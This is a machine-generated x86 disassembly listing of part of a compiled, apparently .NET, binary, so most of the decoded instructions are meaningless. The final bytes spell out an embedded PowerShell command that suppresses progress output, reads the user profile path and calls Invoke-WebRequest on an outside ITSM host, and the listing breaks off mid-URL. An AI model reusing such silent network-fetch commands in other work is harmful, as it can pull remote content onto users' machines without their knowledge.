  404524:	28 36                	sub    %dh,(%esi)
  404526:	00 00                	add    %al,(%eax)
  404528:	06                   	push   %es
  404529:	2c 1c                	sub    $0x1c,%al
  40452b:	72 01                	jb     0x40452e
  40452d:	00 00                	add    %al,(%eax)
  40452f:	70 13                	jo     0x404544
  404531:	07                   	pop    %es
  404532:	2b 09                	sub    (%ecx),%ecx
  404534:	11 06                	adc    %eax,(%esi)
  404536:	11 07                	adc    %eax,(%edi)
  404538:	6f                   	outsl  %ds:(%esi),(%dx)
  404539:	f7 00 00 0a 28 f8    	testl  $0xf8280a00,(%eax)
  40453f:	00 00                	add    %al,(%eax)
  404541:	0a 25 13 07 2d ed    	or     0xed2d0713,%ah
  404547:	11 06                	adc    %eax,(%esi)
  404549:	6f                   	outsl  %ds:(%esi),(%dx)
  40454a:	f9                   	stc
  40454b:	00 00                	add    %al,(%eax)
  40454d:	0a 73 fa             	or     -0x6(%ebx),%dh
  404550:	00 00                	add    %al,(%eax)
  404552:	0a 13                	or     (%ebx),%dl
  404554:	08 11                	or     %dl,(%ecx)
  404556:	08 11                	or     %dl,(%ecx)
  404558:	17                   	pop    %ss
  404559:	2d 0f 11 19 fe       	sub    $0xfe19110f,%eax
  40455e:	06                   	push   %es
  40455f:	7c 00                	jl     0x404561
  404561:	00 06                	add    %al,(%esi)
  404563:	73 f4                	jae    0x404559
  404565:	00 00                	add    %al,(%eax)
  404567:	0a 13                	or     (%ebx),%dl
  404569:	17                   	pop    %ss
  40456a:	11 17                	adc    %edx,(%edi)
  40456c:	6f                   	outsl  %ds:(%esi),(%dx)
  40456d:	fb                   	sti
  40456e:	00 00                	add    %al,(%eax)
  404570:	0a 16                	or     (%esi),%dl
  404572:	13 09                	adc    (%ecx),%ecx
  404574:	16                   	push   %ss
  404575:	13 0a                	adc    (%edx),%ecx
  404577:	02 13                	add    (%ebx),%dl
  404579:	1b 16                	sbb    (%esi),%edx
  40457b:	13 1c 38             	adc    (%eax,%edi,1),%ebx
  40457e:	c7 00 00 00 11 1b    	movl   $0x1b110000,(%eax)
  404584:	11 1c 9a             	adc    %ebx,(%edx,%ebx,4)
  404587:	13 0b                	adc    (%ebx),%ecx
  404589:	11 0b                	adc    %ecx,(%ebx)
  40458b:	72 7b                	jb     0x404608
  40458d:	02 00                	add    (%eax),%al
  40458f:	70 17                	jo     0x4045a8
  404591:	28 fc                	sub    %bh,%ah
  404593:	00 00                	add    %al,(%eax)
  404595:	0a 2d 07 17 0b 38    	or     0x380b1707,%ch
  40459b:	9e                   	sahf
  40459c:	00 00                	add    %al,(%eax)
  40459e:	00 11                	add    %dl,(%ecx)
  4045a0:	0b 72 87             	or     -0x79(%edx),%esi
  4045a3:	02 00                	add    (%eax),%al
  4045a5:	70 19                	jo     0x4045c0
  4045a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4045a8:	fd                   	std
  4045a9:	00 00                	add    %al,(%eax)
  4045ab:	0a 2c 61             	or     (%ecx,%eiz,2),%ch
  4045ae:	11 0b                	adc    %ecx,(%ebx)
  4045b0:	17                   	pop    %ss
  4045b1:	8d 35 00 00 01 13    	lea    0x13010000,%esi
  4045b7:	1d 11 1d 16 72       	sbb    $0x72161d11,%eax
  4045bc:	99                   	cltd
  4045bd:	02 00                	add    (%eax),%al
  4045bf:	70 a2                	jo     0x404563
  4045c1:	11 1d 18 17 6f fe    	adc    %ebx,0xfe6f1718
  4045c7:	00 00                	add    %al,(%eax)
  4045c9:	0a 13                	or     (%ebx),%dl
  4045cb:	0c 11                	or     $0x11,%al
  4045cd:	0c 8e                	or     $0x8e,%al
  4045cf:	69 18 2e 20 72 9d    	imul   $0x9d72202e,(%eax),%ebx
  4045d5:	02 00                	add    (%eax),%al
  4045d7:	70 28                	jo     0x404601
  4045d9:	29 00                	sub    %eax,(%eax)
  4045db:	00 0a                	add    %cl,(%edx)
  4045dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4045de:	2a 00                	sub    (%eax),%al
  4045e0:	00 0a                	add    %cl,(%edx)
  4045e2:	16                   	push   %ss
  4045e3:	1f                   	pop    %ds
  4045e4:	10 28                	adc    %ch,(%eax)
  4045e6:	ff 00                	incl   (%eax)
  4045e8:	00 0a                	add    %cl,(%edx)
  4045ea:	26 17                	es pop %ss
  4045ec:	13 1a                	adc    (%edx),%ebx
  4045ee:	dd 78 03             	fnstsw 0x3(%eax)
  4045f1:	00 00                	add    %al,(%eax)
  4045f3:	11 0c 17             	adc    %ecx,(%edi,%edx,1)
  4045f6:	9a 17 8d 64 00 00 01 	lcall  $0x100,$0x648d17
  4045fd:	13 1e                	adc    (%esi),%ebx
  4045ff:	11 1e                	adc    %ebx,(%esi)
  404601:	16                   	push   %ss
  404602:	1f                   	pop    %ds
  404603:	22 9d 11 1e 6f 00    	and    0x6f1e11(%ebp),%bl
  404609:	01 00                	add    %eax,(%eax)
  40460b:	0a 0c 2b             	or     (%ebx,%ebp,1),%cl
  40460e:	2e 11 0b             	adc    %ecx,%cs:(%ebx)
  404611:	72 7c                	jb     0x40468f
  404613:	03 00                	add    (%eax),%eax
  404615:	70 17                	jo     0x40462e
  404617:	28 fc                	sub    %bh,%ah
  404619:	00 00                	add    %al,(%eax)
  40461b:	0a 2d 08 11 0a 17    	or     0x170a1108,%ch
  404621:	58                   	pop    %eax
  404622:	13 09                	adc    (%ecx),%ecx
  404624:	2b 2e                	sub    (%esi),%ebp
  404626:	11 0b                	adc    %ecx,(%ebx)
  404628:	72 86                	jb     0x4045b0
  40462a:	03 00                	add    (%eax),%eax
  40462c:	70 17                	jo     0x404645
  40462e:	28 fc                	sub    %bh,%ah
  404630:	00 00                	add    %al,(%eax)
  404632:	0a 2d 08 28 01 01    	or     0x1012808,%ch
  404638:	00 0a                	add    %cl,(%edx)
  40463a:	26 2b 17             	sub    %es:(%edi),%edx
  40463d:	11 0a                	adc    %ecx,(%edx)
  40463f:	17                   	pop    %ss
  404640:	58                   	pop    %eax
  404641:	13 0a                	adc    (%edx),%ecx
  404643:	11 1c 17             	adc    %ebx,(%edi,%edx,1)
  404646:	58                   	pop    %eax
  404647:	13 1c 11             	adc    (%ecx,%edx,1),%ebx
  40464a:	1c 11                	sbb    $0x11,%al
  40464c:	1b 8e 69 3f 2e ff    	sbb    -0xd1c097(%esi),%ecx
  404652:	ff                   	(bad)
  404653:	ff 28                	ljmp   *(%eax)
  404655:	48                   	dec    %eax
  404656:	00 00                	add    %al,(%eax)
  404658:	0a 13                	or     (%ebx),%dl
  40465a:	0d 11 0d 72 94       	or     $0x94720d11,%eax
  40465f:	03 00                	add    (%eax),%eax
  404661:	70 6f                	jo     0x4046d2
  404663:	02 01                	add    (%ecx),%al
  404665:	00 0a                	add    %cl,(%edx)
  404667:	13 0e                	adc    (%esi),%ecx
  404669:	11 0e                	adc    %ecx,(%esi)
  40466b:	28 03                	sub    %al,(%ebx)
  40466d:	01 00                	add    %eax,(%eax)
  40466f:	0a 73 04             	or     0x4(%ebx),%dh
  404672:	01 00                	add    %eax,(%eax)
  404674:	0a 13                	or     (%ebx),%dl
  404676:	0f 11 0f             	movups %xmm1,(%edi)
  404679:	6f                   	outsl  %ds:(%esi),(%dx)
  40467a:	05 01 00 0a 13       	add    $0x130a0001,%eax
  40467f:	10 08                	adc    %cl,(%eax)
  404681:	28 0f                	sub    %cl,(%edi)
  404683:	00 00                	add    %al,(%eax)
  404685:	0a 2d 10 08 11 10    	or     0x10110810,%ch
  40468b:	28 06                	sub    %al,(%esi)
  40468d:	01 00                	add    %eax,(%eax)
  40468f:	0a 16                	or     (%esi),%dl
  404691:	13 1a                	adc    (%edx),%ebx
  404693:	dd d3                	fst    %st(3)
  404695:	02 00                	add    (%eax),%al
  404697:	00 11                	add    %dl,(%ecx)
  404699:	05 11 10 6f 07       	add    $0x76f1011,%eax
  40469e:	01 00                	add    %eax,(%eax)
  4046a0:	0a 26                	or     (%esi),%ah
  4046a2:	de 0c 11             	fimuls (%ecx,%edx,1)
  4046a5:	0f 2c 07             	cvttps2pi (%edi),%mm0
  4046a8:	11 0f                	adc    %ecx,(%edi)
  4046aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ab:	60                   	pusha
  4046ac:	00 00                	add    %al,(%eax)
  4046ae:	0a dc                	or     %ah,%bl
  4046b0:	de 0c 11             	fimuls (%ecx,%edx,1)
  4046b3:	0e                   	push   %cs
  4046b4:	2c 07                	sub    $0x7,%al
  4046b6:	11 0e                	adc    %ecx,(%esi)
  4046b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4046b9:	60                   	pusha
  4046ba:	00 00                	add    %al,(%eax)
  4046bc:	0a dc                	or     %ah,%bl
  4046be:	14 13                	adc    $0x13,%al
  4046c0:	11 72 b0             	adc    %esi,-0x50(%edx)
  4046c3:	03 00                	add    (%eax),%eax
  4046c5:	70 73                	jo     0x40473a
  4046c7:	08 01                	or     %al,(%ecx)
  4046c9:	00 0a                	add    %cl,(%edx)
  4046cb:	13 12                	adc    (%edx),%edx
  4046cd:	11 09                	adc    %ecx,(%ecx)
  4046cf:	13 13                	adc    (%ebx),%edx
  4046d1:	38 ae 01 00 00 11    	cmp    %ch,0x11000001(%esi)
  4046d7:	12 02                	adc    (%edx),%al
  4046d9:	11 13                	adc    %edx,(%ebx)
  4046db:	9a 6f 09 01 00 0a 13 	lcall  $0x130a,$0x1096f
  4046e2:	14 11                	adc    $0x11,%al
  4046e4:	14 6f                	adc    $0x6f,%al
  4046e6:	0a 01                	or     (%ecx),%al
  4046e8:	00 0a                	add    %cl,(%edx)
  4046ea:	39 6c 01 00          	cmp    %ebp,0x0(%ecx,%eax,1)
  4046ee:	00 11                	add    %dl,(%ecx)
  4046f0:	14 6f                	adc    $0x6f,%al
  4046f2:	0b 01                	or     (%ecx),%eax
  4046f4:	00 0a                	add    %cl,(%edx)
  4046f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4046f7:	0c 01                	or     $0x1,%al
  4046f9:	00 0a                	add    %cl,(%edx)
  4046fb:	19 40 5a             	sbb    %eax,0x5a(%eax)
  4046fe:	01 00                	add    %eax,(%eax)
  404700:	00 02                	add    %al,(%edx)
  404702:	11 13                	adc    %edx,(%ebx)
  404704:	9a 12 15 28 0d 01 00 	lcall  $0x1,$0xd281512
  40470b:	0a 3a                	or     (%edx),%bh
  40470d:	4a                   	dec    %edx
  40470e:	01 00                	add    %eax,(%eax)
  404710:	00 11                	add    %dl,(%ecx)
  404712:	11 2c 0a             	adc    %ebp,(%edx,%ecx,1)
  404715:	11 05 11 11 6f 0e    	adc    %eax,0xe6f1111
  40471b:	01 00                	add    %eax,(%eax)
  40471d:	0a 26                	or     (%esi),%ah
  40471f:	11 14 6f             	adc    %edx,(%edi,%ebp,2)
  404722:	0b 01                	or     (%ecx),%eax
  404724:	00 0a                	add    %cl,(%edx)
  404726:	18 6f 0f             	sbb    %ch,0xf(%edi)
  404729:	01 00                	add    %eax,(%eax)
  40472b:	0a 6f 10             	or     0x10(%edi),%ch
  40472e:	01 00                	add    %eax,(%eax)
  404730:	0a 6f 11             	or     0x11(%edi),%ch
  404733:	01 00                	add    %eax,(%eax)
  404735:	0a 72 01             	or     0x1(%edx),%dh
  404738:	00 00                	add    %al,(%eax)
  40473a:	70 28                	jo     0x404764
  40473c:	c5 00                	lds    (%eax),%eax
  40473e:	00 0a                	add    %cl,(%edx)
  404740:	2c 19                	sub    $0x19,%al
  404742:	11 14 6f             	adc    %edx,(%edi,%ebp,2)
  404745:	0b 01                	or     (%ecx),%eax
  404747:	00 0a                	add    %cl,(%edx)
  404749:	17                   	pop    %ss
  40474a:	6f                   	outsl  %ds:(%esi),(%dx)
  40474b:	0f 01 00             	sgdtl  (%eax)
  40474e:	0a 6f 10             	or     0x10(%edi),%ch
  404751:	01 00                	add    %eax,(%eax)
  404753:	0a 13                	or     (%ebx),%dl
  404755:	11 38                	adc    %edi,(%eax)
  404757:	23 01                	and    (%ecx),%eax
  404759:	00 00                	add    %al,(%eax)
  40475b:	11 14 6f             	adc    %edx,(%edi,%ebp,2)
  40475e:	0b 01                	or     (%ecx),%eax
  404760:	00 0a                	add    %cl,(%edx)
  404762:	18 6f 0f             	sbb    %ch,0xf(%edi)
  404765:	01 00                	add    %eax,(%eax)
  404767:	0a 6f 10             	or     0x10(%edi),%ch
  40476a:	01 00                	add    %eax,(%eax)
  40476c:	0a 72 e0             	or     -0x20(%edx),%dh
  40476f:	03 00                	add    (%eax),%eax
  404771:	70 28                	jo     0x40479b
  404773:	c5 00                	lds    (%eax),%eax
  404775:	00 0a                	add    %cl,(%edx)
  404777:	2d 23 11 14 6f       	sub    $0x6f141123,%eax
  40477c:	0b 01                	or     (%ecx),%eax
  40477e:	00 0a                	add    %cl,(%edx)
  404780:	18 6f 0f             	sbb    %ch,0xf(%edi)
  404783:	01 00                	add    %eax,(%eax)
  404785:	0a 6f 10             	or     0x10(%edi),%ch
  404788:	01 00                	add    %eax,(%eax)
  40478a:	0a 6f 12             	or     0x12(%edi),%ch
  40478d:	01 00                	add    %eax,(%eax)
  40478f:	0a 72 ea             	or     -0x16(%edx),%dh
  404792:	03 00                	add    (%eax),%eax
  404794:	70 28                	jo     0x4047be
  404796:	c5 00                	lds    (%eax),%eax
  404798:	00 0a                	add    %cl,(%edx)
  40479a:	2c 28                	sub    $0x28,%al
  40479c:	11 05 11 14 6f 0b    	adc    %eax,0xb6f1411
  4047a2:	01 00                	add    %eax,(%eax)
  4047a4:	0a 17                	or     (%edi),%dl
  4047a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a7:	0f 01 00             	sgdtl  (%eax)
  4047aa:	0a 6f 10             	or     0x10(%edi),%ch
  4047ad:	01 00                	add    %eax,(%eax)
  4047af:	0a 17                	or     (%edi),%dl
  4047b1:	8c 8f 00 00 01 6f    	mov    %cs,0x6f010000(%edi)
  4047b7:	13 01                	adc    (%ecx),%eax
  4047b9:	00 0a                	add    %cl,(%edx)
  4047bb:	26 14 13             	es adc $0x13,%al
  4047be:	11 38                	adc    %edi,(%eax)
  4047c0:	ba 00 00 00 11       	mov    $0x11000000,%edx
  4047c5:	14 6f                	adc    $0x6f,%al
  4047c7:	0b 01                	or     (%ecx),%eax
  4047c9:	00 0a                	add    %cl,(%edx)
  4047cb:	18 6f 0f             	sbb    %ch,0xf(%edi)
  4047ce:	01 00                	add    %eax,(%eax)
  4047d0:	0a 6f 10             	or     0x10(%edi),%ch
  4047d3:	01 00                	add    %eax,(%eax)
  4047d5:	0a 72 f6             	or     -0xa(%edx),%dh
  4047d8:	03 00                	add    (%eax),%eax
  4047da:	70 28                	jo     0x404804
  4047dc:	c5 00                	lds    (%eax),%eax
  4047de:	00 0a                	add    %cl,(%edx)
  4047e0:	2d 23 11 14 6f       	sub    $0x6f141123,%eax
  4047e5:	0b 01                	or     (%ecx),%eax
  4047e7:	00 0a                	add    %cl,(%edx)
  4047e9:	18 6f 0f             	sbb    %ch,0xf(%edi)
  4047ec:	01 00                	add    %eax,(%eax)
  4047ee:	0a 6f 10             	or     0x10(%edi),%ch
  4047f1:	01 00                	add    %eax,(%eax)
  4047f3:	0a 6f 12             	or     0x12(%edi),%ch
  4047f6:	01 00                	add    %eax,(%eax)
  4047f8:	0a 72 02             	or     0x2(%edx),%dh
  4047fb:	04 00                	add    $0x0,%al
  4047fd:	70 28                	jo     0x404827
  4047ff:	c5 00                	lds    (%eax),%eax
  404801:	00 0a                	add    %cl,(%edx)
  404803:	2c 25                	sub    $0x25,%al
  404805:	11 05 11 14 6f 0b    	adc    %eax,0xb6f1411
  40480b:	01 00                	add    %eax,(%eax)
  40480d:	0a 17                	or     (%edi),%dl
  40480f:	6f                   	outsl  %ds:(%esi),(%dx)
  404810:	0f 01 00             	sgdtl  (%eax)
  404813:	0a 6f 10             	or     0x10(%edi),%ch
  404816:	01 00                	add    %eax,(%eax)
  404818:	0a 16                	or     (%esi),%dl
  40481a:	8c 8f 00 00 01 6f    	mov    %cs,0x6f010000(%edi)
  404820:	13 01                	adc    (%ecx),%eax
  404822:	00 0a                	add    %cl,(%edx)
  404824:	26 14 13             	es adc $0x13,%al
  404827:	11 2b                	adc    %ebp,(%ebx)
  404829:	54                   	push   %esp
  40482a:	11 05 11 14 6f 0b    	adc    %eax,0xb6f1411
  404830:	01 00                	add    %eax,(%eax)
  404832:	0a 17                	or     (%edi),%dl
  404834:	6f                   	outsl  %ds:(%esi),(%dx)
  404835:	0f 01 00             	sgdtl  (%eax)
  404838:	0a 6f 10             	or     0x10(%edi),%ch
  40483b:	01 00                	add    %eax,(%eax)
  40483d:	0a 11                	or     (%ecx),%dl
  40483f:	14 6f                	adc    $0x6f,%al
  404841:	0b 01                	or     (%ecx),%eax
  404843:	00 0a                	add    %cl,(%edx)
  404845:	18 6f 0f             	sbb    %ch,0xf(%edi)
  404848:	01 00                	add    %eax,(%eax)
  40484a:	0a 6f 10             	or     0x10(%edi),%ch
  40484d:	01 00                	add    %eax,(%eax)
  40484f:	0a 6f 13             	or     0x13(%edi),%ch
  404852:	01 00                	add    %eax,(%eax)
  404854:	0a 26                	or     (%esi),%ah
  404856:	14 13                	adc    $0x13,%al
  404858:	11 2b                	adc    %ebp,(%ebx)
  40485a:	23 11                	and    (%ecx),%edx
  40485c:	11 2c 13             	adc    %ebp,(%ebx,%edx,1)
  40485f:	11 05 11 11 02 11    	adc    %eax,0x11021111
  404865:	13 9a 6f 13 01 00    	adc    0x1136f(%edx),%ebx
  40486b:	0a 26                	or     (%esi),%ah
  40486d:	14 13                	adc    $0x13,%al
  40486f:	11 2b                	adc    %ebp,(%ebx)
  404871:	0c 11                	or     $0x11,%al
  404873:	05 02 11 13 9a       	add    $0x9a131102,%eax
  404878:	6f                   	outsl  %ds:(%esi),(%dx)
  404879:	14 01                	adc    $0x1,%al
  40487b:	00 0a                	add    %cl,(%edx)
  40487d:	26 11 13             	adc    %edx,%es:(%ebx)
  404880:	17                   	pop    %ss
  404881:	58                   	pop    %eax
  404882:	13 13                	adc    (%ebx),%edx
  404884:	11 13                	adc    %edx,(%ebx)
  404886:	02 8e 69 3f 48 fe    	add    -0x1b7c097(%esi),%cl
  40488c:	ff                   	(bad)
  40488d:	ff 11                	call   *(%ecx)
  40488f:	11 2c 0a             	adc    %ebp,(%edx,%ecx,1)
  404892:	11 05 11 11 6f 0e    	adc    %eax,0xe6f1111
  404898:	01 00                	add    %eax,(%eax)
  40489a:	0a 26                	or     (%esi),%ah
  40489c:	11 05 72 10 04 00    	adc    %eax,0x41072
  4048a2:	70 6f                	jo     0x404913
  4048a4:	15 01 00 0a 26       	adc    $0x260a0001,%eax
  4048a9:	11 05 72 26 04 00    	adc    %eax,0x42672
  4048af:	70 6f                	jo     0x404920
  4048b1:	0e                   	push   %cs
  4048b2:	01 00                	add    %eax,(%eax)
  4048b4:	0a 26                	or     (%esi),%ah
  4048b6:	11 05 11 06 11 08    	adc    %eax,0x8110611
  4048bc:	14 11                	adc    $0x11,%al
  4048be:	18 2d 0f 11 19 fe    	sbb    %ch,0xfe19110f
  4048c4:	06                   	push   %es
  4048c5:	7d 00                	jge    0x4048c7
  4048c7:	00 06                	add    %al,(%esi)
  4048c9:	73 16                	jae    0x4048e1
  4048cb:	01 00                	add    %eax,(%eax)
  4048cd:	0a 13                	or     (%ebx),%dl
  4048cf:	18 11                	sbb    %dl,(%ecx)
  4048d1:	18 14 6f             	sbb    %dl,(%edi,%ebp,2)
  4048d4:	02 00                	add    (%eax),%al
  4048d6:	00 2b                	add    %ch,(%ebx)
  4048d8:	26 06                	es push %es
  4048da:	6f                   	outsl  %ds:(%esi),(%dx)
  4048db:	73 00                	jae    0x4048dd
  4048dd:	00 06                	add    %al,(%esi)
  4048df:	2d 10 11 19 7b       	sub    $0x7b191110,%eax
  4048e4:	59                   	pop    %ecx
  4048e5:	00 00                	add    %al,(%eax)
  4048e7:	04 1f                	add    $0x1f,%al
  4048e9:	64 6f                	outsl  %fs:(%esi),(%dx)
  4048eb:	18 01                	sbb    %al,(%ecx)
  4048ed:	00 0a                	add    %cl,(%edx)
  4048ef:	2c e8                	sub    $0xe8,%al
  4048f1:	11 05 6f 19 01 00    	adc    %eax,0x1196f
  4048f7:	0a 11                	or     (%ecx),%dl
  4048f9:	05 6f 1a 01 00       	add    $0x11a6f,%eax
  4048fe:	0a 6f 1b             	or     0x1b(%edi),%ch
  404901:	01 00                	add    %eax,(%eax)
  404903:	0a 1b                	or     (%ebx),%bl
  404905:	33 1d 11 19 7b 58    	xor    0x587b1911,%ebx
  40490b:	00 00                	add    %al,(%eax)
  40490d:	04 11                	add    $0x11,%al
  40490f:	05 6f 1a 01 00       	add    $0x11a6f,%eax
  404914:	0a 6f 1c             	or     0x1c(%edi),%ch
  404917:	01 00                	add    %eax,(%eax)
  404919:	0a 6f e4             	or     -0x1c(%edi),%ch
  40491c:	00 00                	add    %al,(%eax)
  40491e:	0a 6f e5             	or     -0x1b(%edi),%ch
  404921:	00 00                	add    %al,(%eax)
  404923:	0a de                	or     %dh,%bl
  404925:	0c 11                	or     $0x11,%al
  404927:	05 2c 07 11 05       	add    $0x511072c,%eax
  40492c:	6f                   	outsl  %ds:(%esi),(%dx)
  40492d:	60                   	pusha
  40492e:	00 00                	add    %al,(%eax)
  404930:	0a dc                	or     %ah,%bl
  404932:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  404935:	1d 01 00 0a de       	sbb    $0xde0a0001,%eax
  40493a:	0c 11                	or     $0x11,%al
  40493c:	04 2c                	add    $0x2c,%al
  40493e:	07                   	pop    %es
  40493f:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  404942:	60                   	pusha
  404943:	00 00                	add    %al,(%eax)
  404945:	0a dc                	or     %ah,%bl
  404947:	de 03                	fiadds (%ebx)
  404949:	26 de 00             	fiadds %es:(%eax)
  40494c:	07                   	pop    %es
  40494d:	2c 15                	sub    $0x15,%al
  40494f:	72 34                	jb     0x404985
  404951:	04 00                	add    $0x0,%al
  404953:	70 28                	jo     0x40497d
  404955:	29 00                	sub    %eax,(%eax)
  404957:	00 0a                	add    %cl,(%edx)
  404959:	6f                   	outsl  %ds:(%esi),(%dx)
  40495a:	2a 00                	sub    (%eax),%al
  40495c:	00 0a                	add    %cl,(%edx)
  40495e:	28 ac 00 00 0a 26 06 	sub    %ch,0x6260a00(%eax,%eax,1)
  404965:	6f                   	outsl  %ds:(%esi),(%dx)
  404966:	75 00                	jne    0x404968
  404968:	00 06                	add    %al,(%esi)
  40496a:	2a 11                	sub    (%ecx),%dl
  40496c:	1a 2a                	sbb    (%edx),%ch
  40496e:	00 00                	add    %al,(%eax)
  404970:	41                   	inc    %ecx
  404971:	7c 00                	jl     0x404973
  404973:	00 02                	add    %al,(%edx)
  404975:	00 00                	add    %al,(%eax)
  404977:	00 07                	add    %al,(%edi)
  404979:	02 00                	add    (%eax),%al
  40497b:	00 2d 00 00 00 34    	add    %ch,0x34000000
  404981:	02 00                	add    (%eax),%al
  404983:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404986:	00 00                	add    %al,(%eax)
  404988:	00 00                	add    %al,(%eax)
  40498a:	00 00                	add    %al,(%eax)
  40498c:	02 00                	add    (%eax),%al
  40498e:	00 00                	add    %al,(%eax)
  404990:	f9                   	stc
  404991:	01 00                	add    %eax,(%eax)
  404993:	00 49 00             	add    %cl,0x0(%ecx)
  404996:	00 00                	add    %al,(%eax)
  404998:	42                   	inc    %edx
  404999:	02 00                	add    (%eax),%al
  40499b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40499e:	00 00                	add    %al,(%eax)
  4049a0:	00 00                	add    %al,(%eax)
  4049a2:	00 00                	add    %al,(%eax)
  4049a4:	02 00                	add    (%eax),%al
  4049a6:	00 00                	add    %al,(%eax)
  4049a8:	7e 00                	jle    0x4049aa
  4049aa:	00 00                	add    %al,(%eax)
  4049ac:	38 04 00             	cmp    %al,(%eax,%eax,1)
  4049af:	00 b6 04 00 00 0c    	add    %dh,0xc000004(%esi)
  4049b5:	00 00                	add    %al,(%eax)
  4049b7:	00 00                	add    %al,(%eax)
  4049b9:	00 00                	add    %al,(%eax)
  4049bb:	00 02                	add    %al,(%edx)
  4049bd:	00 00                	add    %al,(%eax)
  4049bf:	00 68 00             	add    %ch,0x0(%eax)
  4049c2:	00 00                	add    %al,(%eax)
  4049c4:	63 04 00             	arpl   %eax,(%eax,%eax,1)
  4049c7:	00 cb                	add    %cl,%bl
  4049c9:	04 00                	add    $0x0,%al
  4049cb:	00 0c 00             	add    %cl,(%eax,%eax,1)
	...
  4049d6:	00 00                	add    %al,(%eax)
  4049d8:	60                   	pusha
  4049d9:	00 00                	add    %al,(%eax)
  4049db:	00 79 04             	add    %bh,0x4(%ecx)
  4049de:	00 00                	add    %al,(%eax)
  4049e0:	d9 04 00             	flds   (%eax,%eax,1)
  4049e3:	00 03                	add    %al,(%ebx)
  4049e5:	00 00                	add    %al,(%eax)
  4049e7:	00 6b 00             	add    %ch,0x0(%ebx)
  4049ea:	00 01                	add    %al,(%ecx)
  4049ec:	6a 72                	push   $0x72
  4049ee:	5c                   	pop    %esp
  4049ef:	04 00                	add    $0x0,%al
  4049f1:	70 28                	jo     0x404a1b
  4049f3:	29 00                	sub    %eax,(%eax)
  4049f5:	00 0a                	add    %cl,(%edx)
  4049f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4049f8:	2a 00                	sub    (%eax),%al
  4049fa:	00 0a                	add    %cl,(%edx)
  4049fc:	28 a8 00 00 0a 73    	sub    %ch,0x730a0000(%eax)
  404a02:	1e                   	push   %ds
  404a03:	01 00                	add    %eax,(%eax)
  404a05:	0a 7a 1e             	or     0x1e(%edx),%bh
  404a08:	02 28                	add    (%eax),%ch
  404a0a:	13 00                	adc    (%eax),%eax
  404a0c:	00 0a                	add    %cl,(%edx)
  404a0e:	2a 00                	sub    (%eax),%al
  404a10:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404a11:	02 00                	add    (%eax),%al
  404a13:	00 24 50             	add    %ah,(%eax,%edx,2)
  404a16:	72 6f                	jb     0x404a87
  404a18:	67 72 65             	addr16 jb 0x404a80
  404a1b:	73 73                	jae    0x404a90
  404a1d:	50                   	push   %eax
  404a1e:	72 65                	jb     0x404a85
  404a20:	66 65 72 65          	data16 gs jb 0x404a89
  404a24:	6e                   	outsb  %ds:(%esi),(%dx)
  404a25:	63 65 20             	arpl   %esp,0x20(%ebp)
  404a28:	3d 20 27 53 69       	cmp    $0x69532720,%eax
  404a2d:	6c                   	insb   (%dx),%es:(%edi)
  404a2e:	65 6e                	outsb  %gs:(%esi),(%dx)
  404a30:	74 6c                	je     0x404a9e
  404a32:	79 43                	jns    0x404a77
  404a34:	6f                   	outsl  %ds:(%esi),(%dx)
  404a35:	6e                   	outsb  %ds:(%esi),(%dx)
  404a36:	74 69                	je     0x404aa1
  404a38:	6e                   	outsb  %ds:(%esi),(%dx)
  404a39:	75 65                	jne    0x404aa0
  404a3b:	27                   	daa
  404a3c:	3b 20                	cmp    (%eax),%esp
  404a3e:	20 24 75 73 72 20 3d 	and    %ah,0x3d207273(,%esi,2)
  404a45:	20 5b 45             	and    %bl,0x45(%ebx)
  404a48:	6e                   	outsb  %ds:(%esi),(%dx)
  404a49:	76 69                	jbe    0x404ab4
  404a4b:	72 6f                	jb     0x404abc
  404a4d:	6e                   	outsb  %ds:(%esi),(%dx)
  404a4e:	6d                   	insl   (%dx),%es:(%edi)
  404a4f:	65 6e                	outsb  %gs:(%esi),(%dx)
  404a51:	74 5d                	je     0x404ab0
  404a53:	3a 3a                	cmp    (%edx),%bh
  404a55:	47                   	inc    %edi
  404a56:	65 74 46             	gs je  0x404a9f
  404a59:	6f                   	outsl  %ds:(%esi),(%dx)
  404a5a:	6c                   	insb   (%dx),%es:(%edi)
  404a5b:	64 65 72 50          	fs gs jb 0x404aaf
  404a5f:	61                   	popa
  404a60:	74 68                	je     0x404aca
  404a62:	28 27                	sub    %ah,(%edi)
  404a64:	55                   	push   %ebp
  404a65:	73 65                	jae    0x404acc
  404a67:	72 50                	jb     0x404ab9
  404a69:	72 6f                	jb     0x404ada
  404a6b:	66 69 6c 65 27 29 3b 	imul   $0x3b29,0x27(%ebp,%eiz,2),%bp
  404a72:	24 72                	and    $0x72,%al
  404a74:	65 73 70             	gs jae 0x404ae7
  404a77:	6f                   	outsl  %ds:(%esi),(%dx)
  404a78:	6e                   	outsb  %ds:(%esi),(%dx)
  404a79:	73 65                	jae    0x404ae0
  404a7b:	20 3d 20 49 6e 76    	and    %bh,0x766e4920
  404a81:	6f                   	outsl  %ds:(%esi),(%dx)
  404a82:	6b 65 2d 57          	imul   $0x57,0x2d(%ebp),%esp
  404a86:	65 62 52 65          	bound  %edx,%gs:0x65(%edx)
  404a8a:	71 75                	jno    0x404b01
  404a8c:	65 73 74             	gs jae 0x404b03
  404a8f:	20 2d 55 72 69 20    	and    %ch,0x20697255
  404a95:	22 68 74             	and    0x74(%eax),%ch
  404a98:	74 70                	je     0x404b0a
  404a9a:	73 3a                	jae    0x404ad6
  404a9c:	2f                   	das
  404a9d:	2f                   	das
  404a9e:	6e                   	outsb  %ds:(%esi),(%dx)
  404a9f:	65 72 66             	gs jb  0x404b08
  404aa2:	65 72 2e             	gs jb  0x404ad3
  404aa5:	69 74 73 6d 2d 75 73 	imul   $0x3173752d,0x6d(%ebx,%esi,2),%esi
  404aac:	31 
  404aad:	2e 63 6f 6d          	arpl   %ebp,%cs:0x6d(%edi)
  404ab1:	6f                   	outsl  %ds:(%esi),(%dx)
  404ab2:	64 6f                	outsl  %fs:(%esi),(%dx)
  404ab4:	2e 63 6f 6d          	arpl   %ebp,%cs:0x6d(%edi)
  404ab8:	2f                   	das
